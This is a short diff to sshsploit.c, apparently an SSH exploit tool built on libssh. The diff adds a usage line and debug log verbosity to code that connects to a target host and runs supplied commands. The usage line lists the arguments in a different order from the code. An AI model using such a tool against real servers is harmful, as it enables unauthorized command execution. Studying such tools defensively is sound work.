@@ -6,7 +6,7 @@ Link:
 Build:
     gcc sshsploit.c -o sshsploit -std=c99 -lssh
 Usage:
-
+    ./ssh sploit host port user command
 */
 
 #define _GNU_SOURCE
@@ -84,6 +84,7 @@ int main(int argc, char **argv) {
   char *target_user = argv[2];
   unsigned short target_port = atoi (argv[3]);
   char *shell_commands = argv[4];
+  int verbosity = SSH_LOG_PROTOCOL;
 
   ssh_session my_ssh_session;
   int rc;
@@ -94,6 +95,7 @@ int main(int argc, char **argv) {
   ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, target_host);
   ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &target_port);
   ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, target_user);
+  ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
  
   // Connect to server
   rc = ssh_connect(my_ssh_session);
